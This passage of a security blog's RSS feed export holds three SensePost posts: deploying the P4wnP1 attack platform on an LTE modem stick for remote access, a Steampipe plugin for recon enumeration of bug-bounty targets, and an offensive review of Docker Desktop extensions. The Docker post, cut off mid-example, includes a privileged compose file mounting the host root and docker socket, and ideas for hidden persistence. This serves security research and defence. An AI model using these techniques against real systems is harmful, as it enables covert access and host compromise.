connector sticking out of it. The other is the actual LTE peripheral. Both of these have firmware which is required to make them functional. One is a Linux operating system, and the other is a program for the Hexagon Digital Signal Processor chip. The LTE peripheral’s firmware just happens to be a file in the “entire device” firmware. So I’ll call it the LTE peripheral firmware, clumsy as it is.\nFortunately, I then found another person ddscentral who had built their own version of the kernel, but had also made the LTE peripheral firmware available to download.\nddscentral even hacked the bootloader to enter fastboot mode when the reset button is pressed while applying power. This means that you can’t brick the device by making the Linux distribution unbootable, which would prevent you from successfully invoking adb bootloader. If it won’t boot, just hold the button while plugging it in to the host, and it will show up in fastboot devices. Magic! Just follow the instructions at the link above, and all should be good. With that done, I was able to get an LTE peripheral that recognised the modem, and my Vodacom SIM card, but I was still unable to get online.\nAfter a lot of hair pulling, I finally figured out that there are some built-in profiles in the LTE peripheral firmware that do not have the correct APN set. Running qmicli -d /dev/wwan0qmi0 -p --wds-get-profile-list=3gpp showed 3 profiles, two with an empty APN, and one with \"m2m\". None of which will work for Vodacom in South Africa. I made sure that the APN setting in the NetworkManager interface definition was correctly set to \"internet\", but that still did not work. After much going around, I discovered that the following script run at startup would do the trick.\n#!/bin/sh\n\n# wait for the modem to enumerate to the host OS\nwhile [ ! -e /dev/wwan0qmi0 ] ; do\n\tsleep 5\ndone\n\nfor i in 1 2 3 ; do\n\t/usr/bin/qmicli -d /dev/wwan0qmi0 -p --wds-modify-profile=\"3gpp,$i,apn=internet,pdp-type=ipv4v6\"\ndone 2>&1 | tee /tmp/qmicli.log\nThis was run in the background from /etc/rc.local, after enabling the rc-local systemd unit, and creating /etc/rc.local as an executable shell script.\nFinally! I could now disable the WiFi interface, and connect purely over the LTE interface. Except … many mobile service providers use Carrier Grade NAT, making it impossible to establish inbound connections to mobile devices on their network. And even for those that don’t, how do you find it in the first place? Well, the second can be addressed using Dynamic DNS, but the first? I decided to create a Wireguard VPN to a convenient jump box. I’ll skip the instructions for that, as I simply followed a tutorial that I found online anyway. Just remember to add the PersistentKeepalive parameter so that it will establish the connection immediately, and not just when some process on the device tries to connect to another VPN endpoint.\nNow I can get to my device using something similar to the following SSH config entry:\nHost openstick-jumpbox\n        User root\n        ProxyJump jumpbox\n        Hostname 192.168.167.117\n        LocalForward 18000 localhost:8000\nThe need for the LocalForward will become clear in due course.\nSweet! Finally, we can start getting P4wnP1 installed. The easiest way is to simply clone the P4wnP1_aloa repo, and then copy the files to the right place. There are also a few dependencies required by P4wnP1, that are not installed by default.\napt install hostapd iproute2 iw hostapd git\ngit clone https://github.com/RoganDawes/P4wnP1_aloa\ncd P4wnP1_aloa\nmkdir -p /usr/local/P4wnP1\ncp build/P4wnP1_* /usr/local/bin/\ncp -r dist/* /usr/local/P4wnP1/\ncp build/webapp* /usr/local/P4wnP1/www\nmv /usr/local/P4wnP1/P4wnP1.service /etc/systemd/system/\nNow P4wnP1 should be ready to run, but there is another wrinkle to deal with first. Up until now, we have been able to get into the modem by using adb shell from the PC that the modem is plugged into. This is managed by the mobian-usb-gadget systemd unit. But that is also using the USB interface, so we first have to stop/disable that, before P4wnP1 can take it over. Just be aware that from this point, your emergency access path is going away, so if you manage to lock yourself out (e.g. the LTE interface doesn’t come up for whatever reason), you might have to re-install it from scratch! There are pads on the PCB for a serial console which may provide an alternative access route, but I have not investigated those yet. They ARE documented, at least. Also be aware that while the device might already have a WiFi network interface defined, P4wnP1 will try to reconfigure it according to its own configuration settings, and so far, I have not been able to get this working. So don’t count on the WiFi when P4wnP1 is running.\nI have used the mac80211_hwsim in the past on the NanoPi R1S to add fake WLAN interfaces, so that P4wnP1 will leave the real interface alone, but the kernel module has not been compiled in the images provided. I’m looking into building my own images, and will definitely include it when I do.\nAll that said, you can stop the adb interface and start P4wnP1 as follows:\nsystemctl stop mobian-usb-gadget\nsystemctl start P4wnP1.service\nNote that I didn’t enable the P4wnP1 service, or disable the mobian one just yet, allowing a simple reboot to re-activate the ADB daemon.\nCheck that P4wnP1 is running successfully using journalctl -xfu P4wnP1. If it complains, I might have missed some of its dependencies in my commands above.\nNow, if you are connected to your device using the SSH config snippet suggested above, the LocalForward should allow you to open your browser to http://localhost:18000, and access the P4wnP1 control interface. NB! P4wnP1 will listen on all interfaces by default, and there is no authentication! This is ok when the interfaces are all connected to trusted networks, and the WiFi passphrase is changed to a strong unique value, etc, etc. It’s a slightly different story when one of the interfaces is an LTE one, possibly exposed to the broader internet. I’d suggest using an iptables/nftables rule to prevent access to port 50051 and port 8000, or else editing the source and changing “0.0.0.0” to “127.0.0.1” and rebuilding. Now you can do all the P4wnP1 things you could do on any other platform, just from much farther away.\nOne thing to be aware of is that the thermal design of this hardware is not fantastic, and it may overheat if pushed too hard. The devices ship with firmware that only uses two of the four available cores as a result, but the replacement kernels are not restricted in this way. If you experience your device overheating, or becoming unstable, you can disable cores with chcpu -d 2,3 to disable cores 2 and 3. In theory, Linux kernel thermal management should prevent overheating, but I have not tested this at all.",
      "content": "I&amp;#x2019;ve written a couple of blog posts in the past in which I explain how to use Marcus Mengs&amp;#x2019; truly excellent P4wnP1. The most common deployment scenario involves a Raspberry Pi Zero W, or possibly a FriendlyArm NanoPi R1S. The downside of these platforms is that you need to be in fairly close physical proximity in order to access the WiFi interface, or even closer to access Bluetooth. The NanoPi R1S can support an LTE modem, to give you much bigger range, but the downside to that is that it looks pretty clunky.\n\n",
      "contentSnippet": "I&#x2019;ve written a couple of blog posts in the past in which I explain how to use Marcus Mengs&#x2019; truly excellent P4wnP1. The most common deployment scenario involves a Raspberry Pi Zero W, or possibly a FriendlyArm NanoPi R1S. The downside of these platforms is that you need to be in fairly close physical proximity in order to access the WiFi interface, or even closer to access Bluetooth. The NanoPi R1S can support an LTE modem, to give you much bigger range, but the downside to that is that it looks pretty clunky.",
      "guid": "https://sensepost.com/blog/2023/p4wnp1-lte/",
      "isoDate": "2023-07-09T18:06:49.000Z",
      "itunes": {}
    },
    {
      "title": "select * from projectdiscovery join steampipe",
      "link": "https://sensepost.com/blog/2023/select-from-projectdiscovery-join-steampipe/",
      "pubDate": "Mon, 03 Jul 2023 09:52:34 +0000",
      "content:encoded": "<p>Recently, I decided to take a look at <a rel=\"noreferrer noopener\" href=\"https://steampipe.io/\" data-type=\"URL\" data-id=\"https://steampipe.io/\" target=\"_blank\">Steampipe</a> again. I like SQL and the structure it provides, and after playing around a bit I figured: &#x201C;Wouldn&#x2019;t it be cool to write a plugin for the immensely popular <a rel=\"noreferrer noopener\" href=\"https://projectdiscovery.io/\" data-type=\"URL\" data-id=\"https://projectdiscovery.io/\" target=\"_blank\">projectdiscovery</a> tools?&#x201D;. That is exactly what I did and you can find the source code for it here: <a rel=\"noreferrer noopener\" href=\"https://github.com/sensepost/steampipe-plugin-projectdiscovery\" target=\"_blank\">https://github.com/sensepost/steampipe-plugin-projectdiscovery</a>.</p>\n\n\n\n<h2 class=\"wp-block-heading\">overview</h2>\n\n\n\n<p>For the purposes of footprinting, everything you can do with steampipe you can do with a bash script. You technically don&#x2019;t need SQL. However, with bash you always need to bust out some text wrangling with tools like <code>sed</code> and <code>awk</code>. That in itself isn&#x2019;t bad, but the data is inherently unstructured and error-prone as a result. Instead, if we could have our data in a database, we could do arbitrary lookups, join and more!</p>\n\n\n\n<h2 class=\"wp-block-heading\">example</h2>\n\n\n\n<p>Out of the box, steampipe has plenty of <a rel=\"noreferrer noopener\" href=\"https://hub.steampipe.io/plugins\" data-type=\"URL\" data-id=\"https://hub.steampipe.io/plugins\" target=\"_blank\">plugins</a>. One of them is the<a rel=\"noreferrer noopener\" href=\"https://hub.steampipe.io/plugins/turbot/crtsh\" target=\"_blank\"> crt.sh</a> plugin often used to find subdomains based on certificate transparency logs. Using that plugin, we could run a query for domains related to Reddit (ref: their <a href=\"https://hackerone.com/reddit/policy_scopes\" target=\"_blank\" rel=\"noreferrer noopener\">bugbounty</a> scope) via steampipe while filtering out wildcards like this.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>with raw_domains as (\n  select\n    distinct jsonb_array_elements_text(dns_names) as domain\n  from\n    crtsh_certificate\n  where\n    query = &apos;reddit.com&apos;\n)\nselect\n  *\nfrom\n  raw_domains\nwhere\n  domain like &apos;%reddit.com&apos;\n  and domain not like &apos;*%&apos;\norder by\n  domain</code></pre>\n\n\n\n<p>The result? A list of domains, just like you would have come to expect.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>+---------------------------+\n| domain                    |\n+---------------------------+\n| ads-api.reddit.com        |\n| alb.reddit.com            |\n| amp.reddit.com            |\n| h.reddit.com              |\n| m.reddit.com              |\n| pixel.reddit.com          |\n| reddit.com                |\n| tls-test-1.reddit.com     |\n| tls-test-2.reddit.com     |\n| vip.reddit.com            |\n| www--reddit.com           |\n| www.h.reddit.com          |\n| www.m.reddit.com          |\n| www.tls-test-1.reddit.com |\n| www.vip.reddit.com        |\n+---------------------------+</code></pre>\n\n\n\n<p>Now, imagine you wanted to check the IP Address each of these domains resolved to? The <a rel=\"noreferrer noopener\" href=\"https://hub.steampipe.io/plugins/turbot/net\" target=\"_blank\">net</a> plugin comes in handy here!</p>\n\n\n\n<pre class=\"wp-block-code\"><code>with domains as (\n  select\n    distinct jsonb_array_elements_text(dns_names) as domain\n  from\n    crtsh_certificate\n  where\n    query = &apos;reddit.com&apos;\n)\nselect\n  domains.domain, net_dns_record.ip\nfrom\n  domains\nleft join net_dns_record on net_dns_record.domain = domains.domain\nwhere\n  domains.domain like &apos;%reddit.com&apos;\n  and domains.domain not like &apos;*%&apos;\n  and net_dns_record.type = &apos;A&apos;\n  and net_dns_record.ip is not null\norder by\n  domains.domain</code></pre>\n\n\n\n<p>By joining <code>net_dns_record</code>, steampipe would do a DNS record for each of the enumerated domains, and by selecting the <code>ip</code> field from that table, we can see the results as well.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>+---------------------------+-----------------+\n| domain                    | ip              |\n+---------------------------+-----------------+\n| ads-api.reddit.com        | 151.101.193.140 |\n| ads-api.reddit.com        | 151.101.1.140   |\n| ads-api.reddit.com        | 151.101.65.140  |\n| ads-api.reddit.com        | 151.101.129.140 |\n| alb.reddit.com            | 151.101.193.140 |\n| alb.reddit.com            | 151.101.65.140  |\n| alb.reddit.com            | 151.101.1.140   |\n| alb.reddit.com            | 151.101.129.140 |\n| amp.reddit.com            | 199.232.253.140 |\n| h.reddit.com              | 199.232.253.140 |\n| m.reddit.com              | 199.232.253.140 |\n| pixel.reddit.com          | 151.101.1.140   |\n| pixel.reddit.com          | 151.101.65.140  |\n| pixel.reddit.com          | 151.101.193.140 |\n| pixel.reddit.com          | 151.101.129.140 |\n\n[ ... snip ... ]</code></pre>\n\n\n\n<p>Now, what if we were curious about the CDN these IP&#x2019;s were hosted on? Well, with the new <code>projectdiscovery_cdncheck</code> table, we can leverage <a rel=\"noreferrer noopener\" href=\"https://github.com/projectdiscovery/cdncheck\" target=\"_blank\">cdncheck</a> to get that information.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>select\n  target,\n  cdn\nfrom\n  projectdiscovery_cdncheck\nwhere target in (\n  with domains as (\n    select\n      distinct jsonb_array_elements_text(dns_names) as domain\n    from\n      crtsh_certificate\n    where\n      query = &apos;reddit.com&apos;\n  )\n  select\n    rtrim(net_dns_record.ip::text, &apos;/32&apos;)\n  from\n    domains\n  left join net_dns_record on net_dns_record.domain = domains.domain\n  where\n    domains.domain like &apos;%reddit.com&apos;\n    and domains.domain not like &apos;*%&apos;\n    and net_dns_record.type = &apos;A&apos;\n    and net_dns_record.ip is not null\n)</code></pre>\n\n\n\n<p>While the results in this case aren&#x2019;t that interesting, I&#x2019;m sure you get the idea :D</p>\n\n\n\n<pre class=\"wp-block-code\"><code>+-----------------+--------+\n| target          | cdn    |\n+-----------------+--------+\n| 199.232.253.140 | fastly |\n| 151.101.65.140  | fastly |\n| 151.101.1.140   | fastly |\n| 151.101.193.140 | fastly |\n| 151.101.129.140 | fastly |\n+-----------------+--------+</code></pre>\n\n\n\n<p>The tables I implemented are:</p>\n\n\n\n<ul>\n<li>asnmap</li>\n\n\n\n<li>cdncheck</li>\n\n\n\n<li>chaos (needs an api key)</li>\n\n\n\n<li>cloudlist</li>\n\n\n\n<li>dnsx</li>\n\n\n\n<li>httpx</li>\n\n\n\n<li>katana</li>\n\n\n\n<li>naabu</li>\n\n\n\n<li>subfinder</li>\n\n\n\n<li>tlsx</li>\n</ul>\n\n\n\n<p>You can see them all here: <a href=\"https://github.com/sensepost/steampipe-plugin-projectdiscovery/tree/master/projectdiscovery\" target=\"_blank\" rel=\"noreferrer noopener\">https://github.com/sensepost/steampipe-plugin-projectdiscovery/tree/master/projectdiscovery</a>.</p>\n\n\n\n<h2 class=\"wp-block-heading\">conclusion</h2>\n\n\n\n<p>While this is not something entirely new, I think it&#x2019;s an interesting experiment to get more structured data out of your workflow, and a projectdiscovery steampipe plugin is one such way that could work.</p>\n",
      "content:encodedSnippet": "Recently, I decided to take a look at Steampipe again. I like SQL and the structure it provides, and after playing around a bit I figured: “Wouldn’t it be cool to write a plugin for the immensely popular projectdiscovery tools?”. That is exactly what I did and you can find the source code for it here: https://github.com/sensepost/steampipe-plugin-projectdiscovery.\noverview\nFor the purposes of footprinting, everything you can do with steampipe you can do with a bash script. You technically don’t need SQL. However, with bash you always need to bust out some text wrangling with tools like sed and awk. That in itself isn’t bad, but the data is inherently unstructured and error-prone as a result. Instead, if we could have our data in a database, we could do arbitrary lookups, join and more!\nexample\nOut of the box, steampipe has plenty of plugins. One of them is the crt.sh plugin often used to find subdomains based on certificate transparency logs. Using that plugin, we could run a query for domains related to Reddit (ref: their bugbounty scope) via steampipe while filtering out wildcards like this.\nwith raw_domains as (\n  select\n    distinct jsonb_array_elements_text(dns_names) as domain\n  from\n    crtsh_certificate\n  where\n    query = 'reddit.com'\n)\nselect\n  *\nfrom\n  raw_domains\nwhere\n  domain like '%reddit.com'\n  and domain not like '*%'\norder by\n  domain\nThe result? A list of domains, just like you would have come to expect.\n+---------------------------+\n| domain                    |\n+---------------------------+\n| ads-api.reddit.com        |\n| alb.reddit.com            |\n| amp.reddit.com            |\n| h.reddit.com              |\n| m.reddit.com              |\n| pixel.reddit.com          |\n| reddit.com                |\n| tls-test-1.reddit.com     |\n| tls-test-2.reddit.com     |\n| vip.reddit.com            |\n| www--reddit.com           |\n| www.h.reddit.com          |\n| www.m.reddit.com          |\n| www.tls-test-1.reddit.com |\n| www.vip.reddit.com        |\n+---------------------------+\nNow, imagine you wanted to check the IP Address each of these domains resolved to? The net plugin comes in handy here!\nwith domains as (\n  select\n    distinct jsonb_array_elements_text(dns_names) as domain\n  from\n    crtsh_certificate\n  where\n    query = 'reddit.com'\n)\nselect\n  domains.domain, net_dns_record.ip\nfrom\n  domains\nleft join net_dns_record on net_dns_record.domain = domains.domain\nwhere\n  domains.domain like '%reddit.com'\n  and domains.domain not like '*%'\n  and net_dns_record.type = 'A'\n  and net_dns_record.ip is not null\norder by\n  domains.domain\nBy joining net_dns_record, steampipe would do a DNS record for each of the enumerated domains, and by selecting the ip field from that table, we can see the results as well.\n+---------------------------+-----------------+\n| domain                    | ip              |\n+---------------------------+-----------------+\n| ads-api.reddit.com        | 151.101.193.140 |\n| ads-api.reddit.com        | 151.101.1.140   |\n| ads-api.reddit.com        | 151.101.65.140  |\n| ads-api.reddit.com        | 151.101.129.140 |\n| alb.reddit.com            | 151.101.193.140 |\n| alb.reddit.com            | 151.101.65.140  |\n| alb.reddit.com            | 151.101.1.140   |\n| alb.reddit.com            | 151.101.129.140 |\n| amp.reddit.com            | 199.232.253.140 |\n| h.reddit.com              | 199.232.253.140 |\n| m.reddit.com              | 199.232.253.140 |\n| pixel.reddit.com          | 151.101.1.140   |\n| pixel.reddit.com          | 151.101.65.140  |\n| pixel.reddit.com          | 151.101.193.140 |\n| pixel.reddit.com          | 151.101.129.140 |\n\n[ ... snip ... ]\nNow, what if we were curious about the CDN these IP’s were hosted on? Well, with the new projectdiscovery_cdncheck table, we can leverage cdncheck to get that information.\nselect\n  target,\n  cdn\nfrom\n  projectdiscovery_cdncheck\nwhere target in (\n  with domains as (\n    select\n      distinct jsonb_array_elements_text(dns_names) as domain\n    from\n      crtsh_certificate\n    where\n      query = 'reddit.com'\n  )\n  select\n    rtrim(net_dns_record.ip::text, '/32')\n  from\n    domains\n  left join net_dns_record on net_dns_record.domain = domains.domain\n  where\n    domains.domain like '%reddit.com'\n    and domains.domain not like '*%'\n    and net_dns_record.type = 'A'\n    and net_dns_record.ip is not null\n)\nWhile the results in this case aren’t that interesting, I’m sure you get the idea :D\n+-----------------+--------+\n| target          | cdn    |\n+-----------------+--------+\n| 199.232.253.140 | fastly |\n| 151.101.65.140  | fastly |\n| 151.101.1.140   | fastly |\n| 151.101.193.140 | fastly |\n| 151.101.129.140 | fastly |\n+-----------------+--------+\nThe tables I implemented are:\nasnmap\ncdncheck\nchaos (needs an api key)\ncloudlist\ndnsx\nhttpx\nkatana\nnaabu\nsubfinder\ntlsx\nYou can see them all here: https://github.com/sensepost/steampipe-plugin-projectdiscovery/tree/master/projectdiscovery.\nconclusion\nWhile this is not something entirely new, I think it’s an interesting experiment to get more structured data out of your workflow, and a projectdiscovery steampipe plugin is one such way that could work.",
      "content": "Recently, I decided to take a look at Steampipe again. I like SQL and the structure it provides, and after playing around a bit I figured: &amp;#x201C;Wouldn&amp;#x2019;t it be cool to write a plugin for the immensely popular projectdiscovery tools?&amp;#x201D;. That is exactly what I did and you can find the source code for it here: https://github.com/sensepost/steampipe-plugin-projectdiscovery.\n\n",
      "contentSnippet": "Recently, I decided to take a look at Steampipe again. I like SQL and the structure it provides, and after playing around a bit I figured: &#x201C;Wouldn&#x2019;t it be cool to write a plugin for the immensely popular projectdiscovery tools?&#x201D;. That is exactly what I did and you can find the source code for it here: https://github.com/sensepost/steampipe-plugin-projectdiscovery.",
      "guid": "https://sensepost.com/blog/2023/select-from-projectdiscovery-join-steampipe/",
      "isoDate": "2023-07-03T09:52:34.000Z",
      "itunes": {}
    },
    {
      "title": "an offensive look at docker desktop extensions",
      "link": "https://sensepost.com/blog/2023/an-offensive-look-at-docker-desktop-extensions/",
      "pubDate": "Tue, 30 May 2023 07:24:42 +0000",
      "content:encoded": "<p>For our annual internal hacker conference dubbed SenseCon in 2023, I decided to take a quick look at <a rel=\"noreferrer noopener\" href=\"https://docs.docker.com/desktop/extensions/\" target=\"_blank\">Docker Desktop Extensions</a>. Almost exactly a year after being <a rel=\"noreferrer noopener\" href=\"https://www.docker.com/press-release/docker-announces-docker-extensions-and-docker-desktop-for-linux-at-dockercon-2022/\" target=\"_blank\">announced</a>, I wondered what the risks of a malicious docker extension could be. This is a writeup of what I learned, a few tricks I used to get some answers and how I found a &#x201C;non-issue&#x201D; command injection in the extensions SDK. Everything in this post was tested on macOS and Docker Desktop 4.19.0 (106363).</p>\n\n\n\n<p>tl;dr &#x2013; Be extra careful with Docker Desktop Extensions given that it is significantly easier for a malicious extension to run commands, access files and more when compared to a traditional container.</p>\n\n\n\n<p>A summary of interesting things I discovered include:</p>\n\n\n\n<ul>\n<li>Extensions can execute arbitrary operating system commands, even if there isn&#x2019;t a specific binary shipped with the extension. This is a confirmed bug and will be fixed later.</li>\n\n\n\n<li>Running extension service &#x201C;VM&#x2019;s&#x201D; (aka: service containers) don&#x2019;t show up in <code>docker ps</code>. You have to run <code>docker extension ls</code> to see those. This could be a fun persistence technique where malicious code could hide in the extensions service VM, away from endpoint security products&#x2019; prying eyes.</li>\n\n\n\n<li>Service &#x201C;VM&#x2019;s&#x201D; being the long running components of an extension which run as a container can have more privileges than you would be comfortable to give by adding extra port/volume/privilege labels to the extensions <code>docker-compose.yml</code> file. Bonus points for the fact that most enterprise endpoint security solutions probably wont be able to inspect the docker virtual machine either&#x2026; ;)</li>\n\n\n\n<li>Unless an extension author makes their extension open source, the only way to see what it is really doing is to manually inspect / reverse engineer the extension itself. There is no UI to give you an idea of what could be happening, which binaries were included in the extension or otherwise give you an overview of what the extension could do. The most interesting warning is the docs, and a warning when you install extensions via the CLI.</li>\n\n\n\n<li>Extensions don&#x2019;t have to live on the extension Marketplace to be installable. Any well-formed container can be installed as an extension with the <code>docker extension install</code> command.</li>\n</ul>\n\n\n\n<p>As this is a large post, here is a table of contents to help navigate it.</p>\n\n\n\n<ul>\n<li><a href=\"#introduction\">introduction</a></li>\n\n\n\n<li><a href=\"#extensionarchitecture\" data-type=\"internal\" data-id=\"#extensionarchitecture\">extension architecture</a></li>\n\n\n\n<li><a href=\"#extension-backend-communication\" data-type=\"internal\" data-id=\"#extension-backend-communication\">extension -&gt; backend communication</a></li>\n\n\n\n<li><a href=\"#extensionsecuritycontexts\" data-type=\"internal\" data-id=\"#extensionsecuritycontexts\">extension security contexts</a></li>\n\n\n\n<li><a href=\"#onservicevms\">on service &#x201C;VM&#x2019;s&#x201D;</a></li>\n\n\n\n<li><a href=\"#theextension-api-clientsdk\" data-type=\"internal\" data-id=\"#theextension-api-clientsdk\">the extension-api-client sdk</a></li>\n\n\n\n<li><a href=\"#hostvm.cli.exec\" data-type=\"internal\" data-id=\"#hostvm.cli.exec\">(host|vm).cli.exec</a></li>\n\n\n\n<li><a href=\"#debuggingdockerdesktopextensions\">debugging docker desktop extensions</a></li>\n\n\n\n<li><a href=\"#runninghostbinaries\">running host binaries</a></li>\n\n\n\n<li><a href=\"#arbitrarycommandexecutionindocker.cli.exec\">arbitrary command execution in docker.cli.exec()</a></li>\n\n\n\n<li><a href=\"#gettingtheextension-api-clientsdksourcecode\" data-type=\"internal\" data-id=\"#gettingtheextension-api-clientsdksourcecode\">getting the extension-api-client sdk source code</a></li>\n\n\n\n<li><a href=\"#analysingthesdkandfindingthebug\">analysing the sdk and finding the &#x201C;bug&#x201D;</a></li>\n\n\n\n<li><a href=\"#commandexecutionrisksincontext\">command execution risks in context</a></li>\n\n\n\n<li><a href=\"#dockerextensionsforpersistence\">docker extensions for persistence</a></li>\n\n\n\n<li><a href=\"#desktopextensionsandtheextensionmarketplace\">docker desktop extensions and the extension market place</a></li>\n\n\n\n<li><a href=\"#investigatingdockerdesktopextensions\">investigating docker desktop extensions</a></li>\n\n\n\n<li><a href=\"#investigatingextensionsbeforeinstalling\">investigating extensions before installing</a></li>\n\n\n\n<li><a href=\"#investigatingextensionsafterinstalling\">investigating extensions after installing</a></li>\n\n\n\n<li><a href=\"#conclusion\">conclusion</a></li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"introduction\">introduction</h2>\n\n\n\n<p>Like most things, I need to do a bit of an introduction on Docker Desktop Extensions to set the groundwork for the rest of the post. There is a surprising amount of moving parts to extensions. I am going to assume you have a basic familiarity with container runtimes like docker and have an idea how Docker Desktop works with the Virtual Machine driving the container runtime and the Electron-based GUI itself.</p>\n\n\n\n<p>As one does, I skipped reading all of the documentation and dove straight into the <a rel=\"noreferrer noopener\" href=\"https://docs.docker.com/desktop/extensions-sdk/quickstart/\" target=\"_blank\">quick start guide</a>. My first shock came when I ran the <code>docker extension init</code> command as suggested.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-60.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"345\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-60-1024x345.png\" alt=\"\" class=\"wp-image-65291\"></a></figure>\n\n\n\n<p>Yeah, you are reading that right. A Go &#x201C;backend&#x201D; and a React UI resulting in 165MB worth of $stuff&#x2026;</p>\n\n\n\n<pre class=\"wp-block-code\"><code>$ du -sh\n165M\t.</code></pre>\n\n\n\n<p>I pushed on through the guide in disbelief to see what the result would look like by building the extension and installing it as per the document. The result? A new entry in the &#x201C;Extensions&#x201D; section creatively called &#x201C;My Extension&#x201D; that when clicked, showed a user interface with a button and a text box for output.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-62.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"595\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/image-62-1024x595.png\" alt=\"\" class=\"wp-image-65306\"></a></figure>\n\n\n\n<p>This button-pushing-inspecting-the-output flow was the general workflow I used throughout the testing of the Docker Desktop Extensions feature. For development there is a hot reload capability to reduce the time of the feedback loop using the <code>docker extension dev ui-source docker-test-extension http://localhost:3000/</code> command which sets an extensions frontend to point to a local web server (which will make more sense in the next section). Using this you don&#x2019;t have to go through the long <code>docker build</code> part before you can see an incremental change you made, but rather, they reflect almost immediately. </p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"extensionarchitecture\">extension architecture</h2>\n\n\n\n<p>Based on what just happened when running the init command, I figured I needed help to know what could possibly warrant so much complexity. So on to the next document we go. More specifically, the <a rel=\"noreferrer noopener\" href=\"https://docs.docker.com/desktop/extensions-sdk/architecture/\" target=\"_blank\">architecture document</a> that has an image with the high level extension architecture. </p>\n\n\n\n<p>While the documentation is definitely useful (who knew), after diving under the hood a little I came up with an expanded image that I think paints a clearer picture on all of the moving parts as well as how they interact with each other (according to my understanding anyways).</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/docker-extensions-architecture.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"642\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/docker-extensions-architecture-1024x642.png\" alt=\"\" class=\"wp-image-66403\"></a></figure>\n\n\n\n<p>Frontends are written using your typical web technologies (HTML, JavaScript and CSS). Docker generates a React UI skeleton as a suggestion when you init a new extension. Logically, frontends can reach optional extension specific backends which are really just containers (can be multiple container services too) and do this via the <a rel=\"noreferrer noopener\" href=\"https://www.npmjs.com/package/@docker/extension-api-client\" target=\"_blank\">@docker/extension-api-client</a> SDK (embedded within Docker Desktop; more on this later). <code>docker init</code> also generates a Golang backend skeleton as an example (more on this later too).</p>\n\n\n\n<p>Extension frontends don&#x2019;t persist anything by design; this is what backends can be used for. In fact, extension UI&#x2019;s die/reload when you navigate away from them in the UI and forcefully cleanup / kill any long running tasks when needed. Extension backends (also confusingly called &#x201C;VM&#x2019;s&#x201D;) on the other hand live for as long as the extension is installed. Backends are typically web services that can be easily invoked from the frontend via a socket-like interface that the SDK exposes.</p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"extension-backend-communication\">extension -&gt; backend communication</h2>\n\n\n\n<p>It&#x2019;s probably obvious by now, but frontends need to talk to backends. This capability is exposed via the frontend SDK that the extension must use. Under the hood things are a little more complicated though. </p>\n\n\n\n<p>As you may know, Docker Desktop interacts with the Docker Desktop Virtual Machine via a local docker socket. The logic that handles this connection to the docker socket is part of Docker Desktop and is implemented in JavaScript as you&#x2019;d expect from an Electron application. Extensions also communicate via sockets to backends, however they don&#x2019;t use the docker socket. Instead, extension backends need to explicitly expose their own socket such that the frontend (via the SDK) can communicate with it. Technically you could expose a TCP socket, but the documentation suggests a unix socket / named pipe to prevent port clashes with the host operating system. Regardless of the target, Docker Desktop handles all socket communications using the same underlying library and will connect as appropriate depending on where it needs to go. For extensions, a socket hint is needed as part of the extension metadata so that it knows which backend a specific extension connects to.</p>\n\n\n\n<p>Visually, communication flows could be represented as follows (where a container service lives within the Docker Desktop VM and an extension UI lives within the Docker Desktop Dashboard:</p>\n\n\n\n<figure class=\"wp-block-image size-large is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/docker-extensions-comms.png\"><img loading=\"lazy\" decoding=\"async\" src=\"https://sensepost.com/img/pages/blog/2023/an-offensive-look-at-docker-desktop-extensions/docker-extensions-comms-922x1024.png\" alt=\"\" class=\"wp-image-65425\" width=\"461\" height=\"512\"></a></figure>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"extensionsecuritycontexts\">extension security contexts</h2>\n\n\n\n<p>The <a rel=\"noreferrer noopener\" href=\"https://docs.docker.com/desktop/extensions-sdk/architecture/security/\" target=\"_blank\">documentation</a> is fairly clear on the security context of each component of Docker Desktop Extensions. Extensions effectively run as the same user running Docker Desktop, and have the same permissions. More specifically, while the UI runs as the same user as Docker Desktop is running as, the backend runs as a container (which could technically be seen as having less permissions itself but can be configured very permissively as you&#x2019;d see later).</p>\n\n\n\n<p>Extension User Interfaces can leverage the SDK to interact with docker itself, or execute any scripts and or binaries shipped as part of the extension (aka: defined in the extensions metadata). You also have the ability to run new containers which implies that an extension can run any container to execute code, mount any filesystem path and make (and listen for) network connections (via the service container) to local networks.</p>\n\n\n\n<p>In summary, for as long as its possible to run arbitrary containers from the UI component, docker desktop extensions will effectively be arbitrary processes running on your host with no real sandboxing / privilege separation.</p>\n\n\n\n<h2 class=\"wp-block-heading\" id=\"onservicevms\">on service &#x201C;VM&#x2019;s&#x201D;</h2>\n\n\n\n<p>An extension can have one or many supporting services (confusingly called &#x201C;VM&#x2019;s&#x201D;). These are simply docker containers that are orchestrated using a docker-compose.yaml file part of your extension&#x2019;s source. The default service from the init command is fairly simple.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>services:\n  docker-test-extension:\n    image: ${DESKTOP_PLUGIN_IMAGE}</code></pre>\n\n\n\n<p>That in itself is not very interesting, but nothing stops a service from having some extra fun labels like:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>services:\n  docker-test-extension:\n    image: ${DESKTOP_PLUGIN_IMAGE}\n    privileged: true\n    volumes:\n    - /:/host_root\n    - /var/run/docker.sock:/host-docker.sock\n    ports:\n      - 